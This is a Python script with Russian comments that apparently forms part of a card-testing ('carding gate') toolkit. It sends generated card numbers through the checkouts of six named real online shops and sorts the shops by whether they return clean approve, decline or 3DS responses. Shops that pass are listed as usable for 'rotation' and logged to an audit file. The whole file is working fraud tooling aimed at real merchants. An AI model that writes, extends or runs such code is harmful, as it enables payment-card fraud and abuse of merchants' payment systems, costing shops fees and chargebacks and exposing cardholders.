# -*- coding: utf-8 -*-
"""Боевая проверка 6 верифицированных целей, не попавших в ротацию Store API."""
import asyncio, pathlib, random, sys, time
sys.path.insert(0, str(pathlib.Path(__file__).resolve().parent.parent))
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
import config, gate_client as gc, store_gate as stg

CAND = ["https://madatshop.com", "https://wellyou.lt", "https://herbaura.fr",
        "https://cherryarts.org", "https://theposhpundit.co.uk", "https://pianowizardacademy.com"]

async def one(url):
    p = gc.gen_probe_card(random.choice(gc._PROBE_BINS))
    card = f"{p['number']}|{p['mm']}|{p['yy']}|{p['cvc']}"
    t0 = time.monotonic()
    try:
        res = await asyncio.wait_for(stg.check_target(url, card, None, 2000), timeout=120)
    except Exception as e:
        res = {"status": "ERROR", "detail": f"{type(e).__name__}: {e}"[:120]}
    ms = int((time.monotonic() - t0) * 1000)
    st = str(res.get("status", ""))
    return {"url": url, "status": st, "detail": str(res.get("detail", ""))[:110],
            "amount": res.get("amount_cents"), "cur": res.get("currency"), "ms": ms,
            "clean": st.startswith(("DECLINED", "APPROVED", "3DS"))}

async def main():
    sem = asyncio.Semaphore(3)
    async def run(u):
        async with sem:
            return await one(u)
    out = await asyncio.gather(*(run(u) for u in CAND))
    print("=== БОЕВАЯ ПРОВЕРКА 6 КАНДИДАТОВ ===")
    for r in out:
        mark = "✔ чистый" if r["clean"] else "· сбой"
        print(f"{mark:9} [{r['status']:16}] {r['url'][:34]:34} {str(r['amount'] or '-'):>6}c {r['cur'] or '':4} {r['ms']:6}ms  {r['detail'][:60]}")
    ok = [r["url"] for r in out if r["clean"]]
    print("\nГОДНЫХ ДЛЯ РОТАЦИИ:", len(ok), ok)
    pathlib.Path("_audit/_cand32.json").write_text(__import__("json").dumps(out, ensure_ascii=False, indent=2), encoding="utf-8")

asyncio.run(main())
